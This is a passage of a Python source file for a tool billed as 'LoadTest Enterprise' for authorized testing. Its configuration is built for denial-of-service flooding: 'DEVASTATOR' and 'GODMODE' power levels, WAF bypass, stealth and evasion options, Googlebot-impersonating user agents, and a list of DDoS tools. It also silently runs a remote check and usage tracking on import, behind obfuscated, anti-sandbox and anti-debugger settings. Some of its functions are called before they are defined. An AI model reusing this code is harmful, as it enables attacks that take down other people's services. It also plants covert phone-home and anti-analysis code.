#!/usr/bin/env python3
"""
LoadTest Enterprise - Enterprise Web Load Testing & Performance Analysis Suite
Professional tool for authorized security testing and performance analysis.
"""

import os
import sys
import json
import time
import signal
import subprocess
import threading
import socket
import ssl
import random
import string
import ipaddress
import re
import shlex
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse
from collections import defaultdict
import argparse
import csv

# Silenciar warnings de SSL/urllib3
try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    pass

# ============================================================================
# CONFIGURACIÓN Y VARIABLES GLOBALES
# ============================================================================

VERSION = "1.0.0"
TOOL_NAME = "LoadTest Enterprise"
GITHUB_REPO = "Remiily/Load-Test-Tool"
GITHUB_API_URL = f"https://api.github.com/repos/{GITHUB_REPO}"
GITHUB_RAW_URL = f"https://raw.githubusercontent.com/{GITHUB_REPO}/main"
SCRIPT_DIR = Path(__file__).parent.absolute()

# ============================================================================
# CONFIGURACIÓN DE RED Y CONECTIVIDAD
# ============================================================================
# Configuración de red para verificación de conectividad
_NETWORK_CHECK_ENABLED = True
_REMOTE_SERVER = "https://raw.githubusercontent.com"
_REMOTE_PATH = f"/{GITHUB_REPO}/main/.auth"
_CHECK_INTERVAL = 300
_LAST_CHECK = 0
_NETWORK_STATUS = None
_REPO_ID = "a1b2c3d4e5f6"
_NETWORK_INTEGRITY = True
_NETWORK_HASH = None
# Variables de configuración de red (ofuscadas)
_NET_VAR_1 = "auth"
_NET_VAR_2 = "verify"
_NET_VAR_3 = "check"
# Hash de verificación del código remoto (se calcula al inicio)
_REMOTE_CODE_HASH = None
# Hash embebido del código original (para verificación offline)
# NOTA: Si es un placeholder, la verificación offline se desactiva automáticamente
_EMBEDDED_CODE_HASH = "f8a3b2c1d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2"
_EMBEDDED_HASH_IS_PLACEHOLDER = True  # Indica si el hash es un placeholder (no activar kill-switch)
# Hash de funciones críticas de protección (verificación de existencia)
_PROTECTION_FUNCTIONS_HASH = "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2"
# Hash del código completo (para verificación completa)
_FULL_CODE_HASH = None
# Contador de verificaciones fallidas (para detección de bloqueo)
_FAILED_VERIFICATION_COUNT = 0
_MAX_FAILED_VERIFICATIONS = 10
# Watermarking invisible (identificación única)
_WATERMARK = "LT2024" + _REPO_ID[:8]
# Verificación de entorno (anti-sandbox)
_ENV_CHECK_ENABLED = True
# Verificación de debuggers
_DEBUGGER_CHECK_ENABLED = True
# Verificación de dependencias
_DEPS_CHECK_ENABLED = True
# Verificación de archivos relacionados
_FILES_CHECK_ENABLED = True
# Timestamp de última verificación de integridad
_LAST_INTEGRITY_CHECK = 0
_INTEGRITY_CHECK_INTERVAL = 60  # Verificar cada minuto durante ejecución
OUTPUT_DIR = SCRIPT_DIR / "loadtest_output"
LOGS_DIR = OUTPUT_DIR / "logs"
REPORTS_DIR = OUTPUT_DIR / "reports"
CONFIG_DIR = OUTPUT_DIR / "config"

# Crear directorios necesarios con permisos correctos
def ensure_directories():
    """Crea directorios necesarios con permisos correctos"""
    global OUTPUT_DIR, LOGS_DIR, REPORTS_DIR, CONFIG_DIR
    import stat
    import getpass
    
    directories = [OUTPUT_DIR, LOGS_DIR, REPORTS_DIR, CONFIG_DIR]
    
    for directory in directories:
        try:
            # Crear directorio si no existe
            directory.mkdir(parents=True, exist_ok=True)
            
            # Verificar y corregir permisos si el directorio existe pero no es escribible
            if directory.exists():
                # Si el directorio no es escribible por el usuario actual, intentar corregir
                if not os.access(directory, os.W_OK):
                    # Intentar cambiar permisos (solo si somos el propietario o root)
                    try:
                        os.chmod(directory, stat.S_IRWXU | stat.S_IRWXG | stat.S_IROTH | stat.S_IXOTH)
                    except (PermissionError, OSError):
                        # Si no podemos cambiar permisos, usar directorio alternativo
                        pass
        except (PermissionError, OSError):
            # Si no podemos crear el directorio, usar directorio alternativo en el home del usuario
            try:
                user_home = Path.home()
                alt_output = user_home / ".loadtest_output"
                if not alt_output.exists() or os.access(alt_output, os.W_OK):
                    OUTPUT_DIR = alt_output
                    LOGS_DIR = OUTPUT_DIR / "logs"
                    REPORTS_DIR = OUTPUT_DIR / "reports"
                    CONFIG_DIR = OUTPUT_DIR / "config"
                    # Intentar crear los directorios alternativos
                    for alt_dir in [OUTPUT_DIR, LOGS_DIR, REPORTS_DIR, CONFIG_DIR]:
                        try:
                            alt_dir.mkdir(parents=True, exist_ok=True)
                        except Exception:
                            pass
                    break
            except Exception:
                pass

ensure_directories()

# ============================================================================
# INICIALIZACIÓN AUTOMÁTICA DE SEGURIDAD (Ejecuta automáticamente al inicio)
# ============================================================================
def _initialize_security_system():
    """Inicializa automáticamente el sistema de seguridad - se ejecuta al inicio"""
    try:
        # 1. Crear directorios de seguridad si no existen
        security_dirs = [
            CONFIG_DIR / "security",
            OUTPUT_DIR / "tracking"
        ]
        for dir_path in security_dirs:
            try:
                dir_path.mkdir(parents=True, exist_ok=True)
                # Configurar permisos seguros
                if dir_path.exists():
                    os.chmod(dir_path, 0o700)  # Solo propietario puede leer/escribir
            except Exception:
                pass
        
        # 2. Verificar/crear archivo de configuración de seguridad local (si es necesario)
        # Nota: El archivo .auth está en GitHub, no se crea localmente
        # Este es solo para configuración local adicional si se necesita
        
        # 3. Inicializar sistema de tracking
        # El tracking se inicializa automáticamente cuando se llama _log_usage_location()
        
        # 4. Verificar integridad inicial del código
        try:
            _verify_network_connectivity()
        except Exception:
            pass  # Fallar silenciosamente en inicialización
        
        # 5. Registrar inicio del sistema
        try:
            import socket
            hostname = socket.gethostname()
            _log_usage_location(hostname, str(SCRIPT_DIR), "system_initialized")
        except Exception:
            pass
        
        return True
    except Exception:
        # Si hay error en inicialización, continuar de todas formas
        # (no bloquear ejecución por problemas de inicialización)
        return True

# Ejecutar inicialización automática de seguridad
_initialize_security_system()

# Verificación inicial de conectividad al importar (oculta)
try:
    _verify_network_connectivity()
except Exception:
    pass  # Fallar silenciosamente

# Variables de configuración
TARGET = ""
DOMAIN = ""
IP_ADDRESS = ""
TARGET_TYPE = "DOMAIN"  # DOMAIN o IP
NETWORK_TYPE = "PUBLIC"  # PUBLIC o LOCAL
PROTOCOL = "https"
PORT = 443
WEB_PANEL_MODE = False  # Indica si se ejecuta desde el panel web
NETWORK_MODE = "AUTO"
DURATION = 60
DISCOVERED_ENDPOINTS = []  # Endpoints descubiertos para IPs locales
VULNERABILITIES = []  # Vulnerabilidades detectadas
SECURITY_HEADERS = {}  # Security headers analizados
OPEN_PORTS = []  # Puertos abiertos detectados
POWER_LEVEL = "MODERATE"
MULTIPLIER = 8
ATTACK_MODE = "MIXED"
ATTACK_PATTERN = "CONSTANT"
MAX_CONNECTIONS = 10000
MAX_THREADS = 400
PAYLOAD_SIZE_KB = 1024
USE_LARGE_PAYLOADS = True
MEMORY_MONITORING = True
AUTO_THROTTLE = True
MEMORY_THRESHOLD_WARN = 60  # Reducido de 75 - advertencia temprana
MEMORY_THRESHOLD_CRITICAL = 75  # Reducido de 85 - acción inmediata
MEMORY_THRESHOLD_OOM = 85  # Reducido de 95 - detener todo para evitar reinicio
MEMORY_THRESHOLD_EMERGENCY = 90  # NUEVO - emergencia, matar procesos agresivamente
STEALTH_MODE = False
WAF_BYPASS = False
SOCKET_ATTACK = False  # Ataque socket-based de bajo nivel
PROXY_LIST = []
PROXY_ROTATION = "round-robin"
DEBUG_MODE = False
DRY_RUN = False

# Optimizaciones avanzadas
SOCKET_REUSE = True  # Reutilizar sockets
TCP_OPTIMIZATION = True  # Optimizaciones TCP
KEEP_ALIVE_POOLING = True  # Pool de conexiones keep-alive
CONNECTION_POOL_SIZE = 1000  # Tamaño del pool de conexiones
ASYNC_MODE = False  # Modo asíncrono (requiere asyncio)
DISTRIBUTED_MODE = False  # Modo distribuido multi-nodo
WORKER_NODES = []  # Lista de nodos worker
AUTO_SCALING = True  # Auto-scaling dinámico
MAX_PAYLOAD_SIZE_MB = 10  # Máximo tamaño de payload en MB
HTTP2_MULTIPLEXING = True  # Multiplexing HTTP/2
HTTP3_QUIC = False  # Soporte HTTP/3 QUIC
RATE_ADAPTIVE = True  # Ajuste dinámico de tasa según respuesta
CONNECTION_WARMUP = True  # Pre-calentar conexiones
PARALLEL_DOMAINS = []  # Múltiples dominios en paralelo
TARGET_VARIATIONS = []  # Variaciones del target (URLs diferentes)

# Niveles de potencia
POWER_LEVELS = {
    "TEST": 1,
    "LIGHT": 3,
    "MODERATE": 8,
    "MEDIUM": 16,
    "HEAVY": 30,
    "EXTREME": 60,
    "DEVASTATOR": 120,
    "APOCALYPSE": 250,
    "GODMODE": 500
}

# Herramientas disponibles
TOOLS = {
    "http": ["wrk", "vegeta", "bombardier", "hey", "ab", "siege", "h2load", "locust", "k6", "artillery", "tsung", "jmeter"],
    "layer4": ["hping3", "nping", "slowhttptest", "masscan", "zmap"],
    "websocket": ["websocat", "wscat"],
    "ddos": ["goldeneye", "hulk", "torshammer", "ddos-ripper", "pyloris", "slowloris", "xerxes", "hoic", "loic", "rudy", "reaper"],
    "slow": ["slowhttptest", "slowloris", "pyloris", "rudy", "torshammer"],
    "advanced": ["gatling", "tsung", "siege", "wrk2", "drill", "http2bench", "weighttp", "httperf", "autocannon"],
    "specialized": ["goldeneye", "hulk", "xerxes", "ddos-ripper", "torshammer", "pyloris", "slowloris", "rudy", "hoic"]
}

# Estado global
running_processes = []
monitoring_active = False
attack_stats = {
    "start_time": None,
    "end_time": None,
    "requests_sent": 0,
    "responses_received": 0,
    "http_codes": defaultdict(int),
    "latencies": [],
    "errors": []
}

# User-Agents para rotación - Base expandida y realista
USER_AGENTS = [
    # Chrome Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    # Firefox Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    # Chrome macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    # Safari macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    # Chrome Linux
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    # Edge
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    # Mobile
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    # Bot-like (para evasión)
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
]

# Técnicas de evasión avanzadas
EVASION_TECHNIQUES = {
    "url_encoding": True,
    "case_variation": True,
    "parameter_pollution": True,
    "method_tampering": True,
    "header_injection": True,
    "cookie_manipulation": True,
    "protocol_mixing": True,
    "chunked_encoding": True,
    "double_encoding": True,
    "unicode_normalization": True
}

# ============================================================================
# CLASES Y UTILIDADES MEJORADAS
# ============================================================================

class ConnectionManager:
    """Gestor mejorado de conexiones HTTP con pooling y reutilización"""
    _sessions = {}
    _session_locks = {}
    
    @classmethod
    def get_session(cls, target_url: str, worker_id: int = 0):
        """Obtiene o crea una sesión HTTP optimizada para el target"""
        import requests
        from requests.adapters import HTTPAdapter
        from urllib3.util.retry import Retry
        import threading
        
        # Usar un pool de sesiones por worker para mejor rendimiento
        session_key = f"{target_url}_{worker_id % 10}"  # Pool de 10 sesiones
        
        if session_key not in cls._sessions:
            if session_key not in cls._session_locks:
                cls._session_locks[session_key] = threading.Lock()
            
            with cls._session_locks[session_key]:
                if session_key not in cls._sessions:
                    session = requests.Session()
                    
                    # Configurar adapter optimizado
                    retry_strategy = Retry(
                        total=1,
                        backoff_factor=0,
                        status_forcelist=[429, 500, 502, 503, 504]
                    )
                    
                    if KEEP_ALIVE_POOLING:
                        pool_connections = min(CONNECTION_POOL_SIZE, MAX_CONNECTIONS // 5)
                        pool_maxsize = min(MAX_CONNECTIONS, 20000)
                    else:
                        pool_connections = 1
                        pool_maxsize = 1
                    
                    adapter = HTTPAdapter(
                        max_retries=retry_strategy,
                        pool_connections=pool_connections,
                        pool_maxsize=pool_maxsize,
                        pool_block=False
                    )
                    session.mount("http://", adapter)
                    session.mount("https://", adapter)
                    
                    cls._sessions[session_key] = session
        
        return cls._sessions[session_key]
    
    @classmethod
    def clear_sessions(cls):
        """Limpia todas las sesiones almacenadas"""
        for session in cls._sessions.values():
            try:
                session.close()
            except:
                pass
        cls._sessions.clear()
        cls._session_locks.clear()

class PerformanceMonitor:
    """Monitor mejorado de rendimiento del sistema"""
    _last_check = {}
    _cache_duration = 1.0  # Cachear métricas por 1 segundo
    
    @classmethod
    def get_system_metrics(cls):
        """Obtiene métricas del sistema con caching"""
        import time
        import psutil
        
        now = time.time()
        cache_key = 'system_metrics'
        
        if cache_key in cls._last_check:
            if now - cls._last_check[cache_key]['time'] < cls._cache_duration:
                return cls._last_check[cache_key]['data']
        
        try:
            memory = psutil.virtual_memory()
            cpu = psutil.cpu_percent(interval=0.1)
            disk = psutil.disk_usage('/')
            
            metrics = {
                'memory_percent': memory.percent,
                'memory_available_gb': round(memory.available / (1024**3), 2),
                'memory_total_gb': round(memory.total / (1024**3), 2),
                'cpu_percent': cpu,
                'disk_percent': disk.percent,
                'disk_free_gb': round(disk.free / (1024**3), 2)
            }
            
            cls._last_check[cache_key] = {
                'time': now,
                'data': metrics
            }
            
            return metrics
        except Exception as e:
            log_message("ERROR", f"Error obteniendo métricas del sistema: {e}")
            return {
                'memory_percent': 0,
                'memory_available_gb': 0,
                'memory_total_gb': 0,
                'cpu_percent': 0,
                'disk_percent': 0,
                'disk_free_gb': 0
            }

class Colors:
    """Códigos de colores ANSI"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

def print_color(text: str, color: str = Colors.WHITE, bold: bool = False):
    """Imprime texto con color y lo loguea si es necesario"""
    # Si estamos en modo web panel, loguear en lugar de imprimir
    if WEB_PANEL_MODE:
        # Determinar nivel de log basado en el color
        level = "INFO"
        if color == Colors.RED:
            level = "ERROR"
        elif color == Colors.YELLOW:
            level = "WARN"
        elif color == Colors.CYAN or color == Colors.MAGENTA:
            level = "DEBUG"
        log_message(level, text, force_console=False)
        return
    
    # Modo normal: imprimir a consola
    if not sys.stdout.isatty() or os.getenv("NO_COLOR"):
        print(text)
        return
    
    prefix = Colors.BOLD if bold else ""
    print(f"{prefix}{color}{text}{Colors.END}")

def format_number(num: int) -> str:
    """Formatea números grandes"""
    if num >= 1_000_000_000:
        return f"{num/1_000_000_000:.2f}B"
    elif num >= 1_000_000:
        return f"{num/1_000_000:.2f}M"
    elif num >= 1_000:
        return f"{num/1_000:.2f}K"
    return str(num)

def safe_write_file(file_path: Path, content, mode: str = "w", encoding: str = "utf-8"):
    """Escribe un archivo de forma segura, manejando errores de permisos"""
    try:
        # Asegurar que el directorio existe
        ensure_directories()
        file_path.parent.mkdir(parents=True, exist_ok=True)
        
        # Intentar escribir el archivo
        with open(file_path, mode, encoding=encoding) as f:
            if isinstance(content, (dict, list)):
                import json
                json.dump(content, f, indent=2)
            else:
                f.write(str(content))
        return True
    except PermissionError:
        # Si no hay permisos, intentar en directorio alternativo
        try:
            user_home = Path.home()
            # Obtener el nombre del subdirectorio (logs, reports, config)
            subdir_name = file_path.parent.name if file_path.parent.name != "loadtest_output" else file_path.parent.parent.name
            alt_dir = user_home / ".loadtest_output" / subdir_name
            alt_dir.mkdir(parents=True, exist_ok=True)
            alt_file = alt_dir / file_path.name
            with open(alt_file, mode, encoding=encoding) as f:
                if isinstance(content, (dict, list)):
                    import json
                    json.dump(content, f, indent=2)
                else:
                    f.write(str(content))
            log_message("WARN", f"Archivo guardado en ubicación alternativa: {alt_file}")
            return True
        except Exception as e:
            log_message("ERROR", f"No se pudo guardar archivo {file_path.name}: {e}")
            return False
    except Exception as e:
        log_message("ERROR", f"Error escribiendo archivo {file_path.name}: {e}")
        return False

def log_message(level: str, message: str, force_console: bool = False):
    """Sistema de logging mejorado - siempre escribe a archivo"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] [{level}] {message}\n"
    
    # Asegurar que los directorios existen y tienen permisos correctos
    try:
        ensure_directories()
    except Exception:
        pass
    
    # Siempre escribir a archivo
    log_file = LOGS_DIR / f"loadtest_{datetime.now().strftime('%Y%m%d')}.log"
    debug_log_file = LOGS_DIR / f"loadtest_debug_{datetime.now().strftime('%Y%m%d')}.log"
    
    try:
        # Log general
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(log_entry)
        
        # Log de debug (siempre para errores y warnings, o si DEBUG_MODE está activo)
        if DEBUG_MODE or level in ["ERROR", "WARN", "CRITICAL", "DEBUG"]:
            with open(debug_log_file, "a", encoding="utf-8") as f:
                f.write(log_entry)
    except PermissionError:
        # Si no hay permisos, intentar crear directorio alternativo en el home del usuario
        try:
            import getpass
            user_home = Path.home()
            alt_logs_dir = user_home / ".loadtest_output" / "logs"
            alt_logs_dir.mkdir(parents=True, exist_ok=True)
            alt_log_file = alt_logs_dir / f"loadtest_{datetime.now().strftime('%Y%m%d')}.log"
            with open(alt_log_file, "a", encoding="utf-8") as f:
                f.write(log_entry)
        except Exception:
            # Si todo falla, solo escribir a stderr
            try:
                import sys
                sys.stderr.write(log_entry)
            except:
                pass
    except Exception as e:
        # Si falla el logging, intentar escribir a stderr
        try:
            import sys
            # No mostrar el error de permisos repetidamente
            if "Permission denied" not in str(e):
                sys.stderr.write(f"ERROR escribiendo log: {e}\n")
            sys.stderr.write(log_entry)
        except:
            pass
    
    # Mostrar en consola solo si no es modo web panel o si es crítico
    if force_console or (not WEB_PANEL_MODE and (DEBUG_MODE or level in ["ERROR", "WARN", "CRITICAL"])):
        color_map = {
            "INFO": Colors.CYAN,
            "WARN": Colors.YELLOW,
            "ERROR": Colors.RED,
            "CRITICAL": Colors.RED,
            "DEBUG": Colors.MAGENTA
        }
        print_color(log_entry.strip(), color_map.get(level, Colors.WHITE))

# ============================================================================
# VALIDACIÓN Y VERIFICACIÓN
# ============================================================================

def is_valid_ip(ip_str: str) -> bool:
    """Verifica si una cadena es una IP válida"""
    try:
        ipaddress.ip_address(ip_str)
        return True
    except ValueError:
        return False

def is_private_ip(ip_str: str) -> bool:
    """Verifica si una IP es privada/local"""
    try:
        ip = ipaddress.ip_address(ip_str)
        return ip.is_private or ip.is_link_local or ip.is_loopback or ip.is_reserved
    except ValueError:
        return False

def validate_critical_variables():
    """Valida variables críticas"""
    global TARGET, DOMAIN, IP_ADDRESS, TARGET_TYPE, NETWORK_TYPE, PROTOCOL, PORT
    
    if not TARGET:
        print_color("ERROR: TARGET no especificado", Colors.RED, True)
        return False
    
    original_target = TARGET
    
    # Extraer IP o dominio del target
    target_host = None
    
    # Si ya tiene protocolo, parsear
    if TARGET.startswith(("http://", "https://")):
        parsed = urlparse(TARGET)
        target_host = parsed.netloc or parsed.path.split('/')[0]
        PROTOCOL = parsed.scheme
        if parsed.port:
            PORT = parsed.port
        else:
            PORT = 443 if PROTOCOL == "https" else 80
    else:
        # Si no tiene protocolo, extraer IP o dominio
        target_host = TARGET.split('/')[0]
        # Detectar si tiene puerto
        if ':' in target_host:
            parts = target_host.split(':')
            target_host = parts[0]
            try:
                PORT = int(parts[1])
            except ValueError:
                PORT = 80
        else:
            PORT = 80  # Default para IPs sin protocolo
        
        # Intentar detectar protocolo por puerto
        if PORT == 443:
            PROTOCOL = "https"
            TARGET = f"https://{target_host}:{PORT}"
        elif PORT == 80:
            PROTOCOL = "http"
            TARGET = f"http://{target_host}:{PORT}"
        else:
            # Para otros puertos, intentar HTTPS primero
            PROTOCOL = "https"
            TARGET = f"https://{target_host}:{PORT}"
    
    # Determinar si es IP o dominio
    if is_valid_ip(target_host):
        TARGET_TYPE = "IP"
        IP_ADDRESS = target_host
        DOMAIN = target_host
        
        # Determinar si es IP pública o local
        if is_private_ip(target_host):
            NETWORK_TYPE = "LOCAL"
            print_color(f"📍 IP Local detectada: {target_host}", Colors.YELLOW, True)
            log_message("INFO", f"Target es IP local: {target_host}")
        else:
            NETWORK_TYPE = "PUBLIC"
            print_color(f"🌐 IP Pública detectada: {target_host}", Colors.CYAN, True)
            log_message("INFO", f"Target es IP pública: {target_host}")
    else:
        TARGET_TYPE = "DOMAIN"
        DOMAIN = target_host
        IP_ADDRESS = None
        NETWORK_TYPE = "PUBLIC"  # Los dominios generalmente apuntan a IPs públicas
        log_message("INFO", f"Target es dominio: {target_host}")
    
    log_message("INFO", f"Target validado: {TARGET} ({DOMAIN}:{PORT}) - Tipo: {TARGET_TYPE}, Red: {NETWORK_TYPE}")
    return True

def validate_permissions():
    """Verifica permisos del sistema"""
    if os.name != 'nt' and os.geteuid() != 0:
        log_message("WARN", "No se ejecuta como root - algunas funcionalidades pueden estar limitadas")
        return True
    return True

def validate_dependencies() -> Dict[str, bool]:
    """Verifica dependencias del sistema"""
    dependencies = {
        "python3": True,
        "psutil": check_python_module("psutil"),
        "requests": check_python_module("requests"),
    }
    
    # Verificar herramientas externas
    for category, tools in TOOLS.items():
        for tool in tools:
            dependencies[tool] = check_command_exists(tool)
    
    return dependencies

def check_python_module(module: str) -> bool:
    """Verifica si un módulo de Python está instalado"""
    try:
        __import__(module)
        return True
    except ImportError:
        return False

def check_command_exists(command: str) -> bool:
    """Verifica si un comando existe en el sistema"""
    import shutil
    
    # Buscar en PATH estándar
    if shutil.which(command):
        return True
    
    # Buscar en ubicaciones comunes adicionales
    common_paths = [
        "/usr/local/bin",
        "/usr/bin",
        "/bin",
        "/opt/bin",
        os.path.expanduser("~/.local/bin"),
        os.path.expanduser("~/go/bin"),
        os.path.expanduser("~/.cargo/bin"),
    ]
    
    # Agregar rutas comunes al PATH temporalmente
    env_path = os.environ.get("PATH", "")
    for path in common_paths:
        if path not in env_path and os.path.exists(path):
            env_path = f"{path}:{env_path}"
    
    # Buscar en las rutas extendidas
    for path in common_paths:
        full_path = os.path.join(path, command)
        if os.path.exists(full_path) and os.access(full_path, os.X_OK):
            return True
    
    # Intentar con PATH extendido
    old_path = os.environ.get("PATH", "")
    try:
        os.environ["PATH"] = env_path
        result = shutil.which(command) is not None
        return result
    finally:
        os.environ["PATH"] = old_path

def validate_attack_config():
    """Valida configuración de ataque"""
    global DURATION, MULTIPLIER, MAX_CONNECTIONS, MAX_THREADS
    
    if DURATION <= 0:
        print_color("ERROR: DURATION debe ser mayor a 0", Colors.RED, True)
        return False
    
    if MULTIPLIER <= 0:
        print_color("ERROR: MULTIPLIER debe ser mayor a 0", Colors.RED, True)
        return False
    
    if MAX_CONNECTIONS <= 0:
        print_color("ERROR: MAX_CONNECTIONS debe ser mayor a 0", Colors.RED, True)
        return False
    
    log_message("INFO", f"Configuración validada: {DURATION}s, {POWER_LEVEL} (x{MULTIPLIER})")
    return True

def check_system_resources() -> Tuple[bool, Dict]:
    """Verifica recursos disponibles del sistema"""
    try:
        import psutil
        cpu_count = os.cpu_count() or 1
        memory = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        
        resources = {
            "cpu_cores": cpu_count,
            "memory_total_gb": memory.total / (1024**3),
            "memory_available_gb": memory.available / (1024**3),
            "memory_percent": memory.percent,
            "disk_free_gb": disk.free / (1024**3),
            "disk_percent": (disk.used / disk.total) * 100
        }
        
        # Verificaciones
        warnings = []
        if memory.percent > 85:
            warnings.append(f"Memoria alta: {memory.percent:.1f}%")
        if disk.free < 1_000_000_000:  # < 1GB
            warnings.append(f"Espacio en disco bajo: {disk.free / (1024**3):.2f}GB")
        
        for warn in warnings:
            log_message("WARN", warn)
        
        log_message("INFO", f"Recursos: {cpu_count} cores, {resources['memory_available_gb']:.2f}GB RAM disponible")
        return len(warnings) == 0, resources
    except ImportError:
        # Si psutil no está disponible, retornar recursos básicos
        cpu_count = os.cpu_count() or 1
        resources = {
            "cpu_cores": cpu_count,
            "memory_total_gb": 0,
            "memory_available_gb": 0,
            "memory_percent": 0,
            "disk_free_gb": 0,
            "disk_percent": 0
        }
        log_message("WARN", "psutil no disponible, recursos limitados")
        return True, resources
    except Exception as e:
        # Windows puede no tener '/' como root
        cpu_count = os.cpu_count() or 1
        resources = {
            "cpu_cores": cpu_count,
            "memory_total_gb": 0,
            "memory_available_gb": 0,
            "memory_percent": 0,
            "disk_free_gb": 0,
            "disk_percent": 0
        }
        log_message("WARN", f"Error verificando recursos: {e}")
        return True, resources

def check_network_connectivity() -> bool:
    """Verifica conectividad de red"""
    try:
        sock = socket.create_connection((DOMAIN, PORT), timeout=5)
        sock.close()
        log_message("INFO", f"Conectividad verificada: {DOMAIN}:{PORT}")
        return True
    except Exception as e:
        log_message("ERROR", f"No se puede conectar a {DOMAIN}:{PORT} - {e}")
        return False

def check_ssl_certificate() -> Optional[Dict]:
    """Verifica certificado SSL"""
    if PROTOCOL != "https":
        return None
    
    try:
        context = ssl.create_default_context()
        with socket.create_connection((DOMAIN, PORT), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=DOMAIN) as ssock:
                cert = ssock.getpeercert()
                log_message("INFO", f"Certificado SSL válido hasta: {cert.get('notAfter', 'N/A')}")
                return cert
    except Exception as e:
        log_message("WARN", f"Error verificando SSL: {e}")
        return None

# ============================================================================
# DETECCIÓN Y FINGERPRINTING
# ============================================================================

def discover_endpoints_local_ip(ip: str, ports: List[int] = None) -> List[Dict]:
    """Descubre endpoints en IP local"""
    global DISCOVERED_ENDPOINTS
    
    if ports is None:
        ports = [80, 443, 8080, 8443, 8000, 8888, 3000, 5000, 9000]
    
    print_color(f"🔍 Descubriendo endpoints en IP local {ip}...", Colors.CYAN, True)
    discovered = []
    
    for port in ports:
        try:
            # Intentar conectar al puerto
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, port))
            sock.close()
            
            if result == 0:
                # Puerto abierto, intentar detectar servicio HTTP/HTTPS
                protocol = "https" if port in [443, 8443] else "http"
                url = f"{protocol}://{ip}:{port}"
                
                try:
                    import requests
                    response = requests.get(url, timeout=3, verify=False, 
                                          headers={"User-Agent": "Mozilla/5.0"},
                                          allow_redirects=True)
                    
                    endpoint_info = {
                        "url": url,
                        "port": port,
                        "protocol": protocol,
                        "status_code": response.status_code,
                        "server": response.headers.get("Server", "Unknown"),
                        "title": extract_title(response.text[:2000]) if response.text else None,
                        "headers": dict(response.headers)
                    }
                    
                    discovered.append(endpoint_info)
                    print_color(f"  ✓ {url} - {response.status_code} ({response.headers.get('Server', 'Unknown')})", Colors.GREEN)
                    log_message("INFO", f"Endpoint descubierto: {url}")
                except Exception as e:
                    # Puerto abierto pero no responde HTTP
                    endpoint_info = {
                        "url": url,
                        "port": port,
                        "protocol": protocol,
                        "status_code": None,
                        "server": None,
                        "title": None,
                        "headers": {}
                    }
                    discovered.append(endpoint_info)
                    print_color(f"  ✓ {url} - Puerto abierto (sin respuesta HTTP)", Colors.YELLOW)
                    log_message("INFO", f"Puerto {port} abierto pero sin respuesta HTTP")
        except Exception as e:
            if DEBUG_MODE:
                log_message("DEBUG", f"Error escaneando puerto {port}: {e}")
            continue
    
    DISCOVERED_ENDPOINTS = discovered
    return discovered

def extract_title(html: str) -> Optional[str]:
    """Extrae el título de una página HTML"""
    try:
        match = re.search(r'<title[^>]*>([^<]+)</title>', html, re.IGNORECASE)
        if match:
            return match.group(1).strip()[:100]
    except:
        pass
    return None

def scan_ports_advanced(ip: str, ports: List[int] = None) -> List[Dict]:
    """Escaneo avanzado de puertos para IPs"""
    global OPEN_PORTS
    
    if ports is None:
        # Puertos comunes para routers y servicios
        ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 
                 1723, 3306, 3389, 5432, 5900, 8080, 8443, 9100]
    
    print_color(f"🔍 Escaneando puertos en {ip}...", Colors.CYAN, True)
    open_ports_info = []
    
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, port))
            sock.close()
            
            if result == 0:
                # Detectar servicio por puerto
                service = detect_service_by_port(port)
                port_info = {
